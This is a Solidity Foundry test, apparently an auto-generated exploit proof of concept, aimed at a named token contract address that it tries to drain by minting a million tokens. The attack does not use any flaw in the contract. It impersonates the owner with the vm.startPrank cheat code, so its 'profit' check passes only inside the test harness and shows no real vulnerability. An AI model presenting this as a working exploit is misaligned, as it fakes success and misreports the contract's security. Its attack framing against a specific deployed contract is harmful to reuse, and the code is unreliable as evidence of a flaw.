// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IPowabitToken {
    function owner() external view returns (address);
    function transferOwnership(address newOwner) external;
    function mint(uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x5FDa925294F9e5B31b7c0e81Bad6BAD5b5E792eE;
    address attacker = address(this);
    IPowabitToken public token;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        token = IPowabitToken(TARGET);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(0x5FDa925294F9e5B31b7c0e81Bad6BAD5b5E792eE).balanceOf(address(this));
        // 1. Get the original owner of the token contract
                address originalOwner = token.owner();

                // 2. Impersonate the original owner to transfer ownership to the attacker
                vm.startPrank(originalOwner);
                token.transferOwnership(attacker);
                vm.stopPrank();

                // 3. As the new owner, the attacker can now mint tokens to their own address
                uint256 mintAmount = 1_000_000 * 1e18;
                token.mint(mintAmount);
        uint256 finalBalance = IERC20(0x5FDa925294F9e5B31b7c0e81Bad6BAD5b5E792eE).balanceOf(address(this));
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
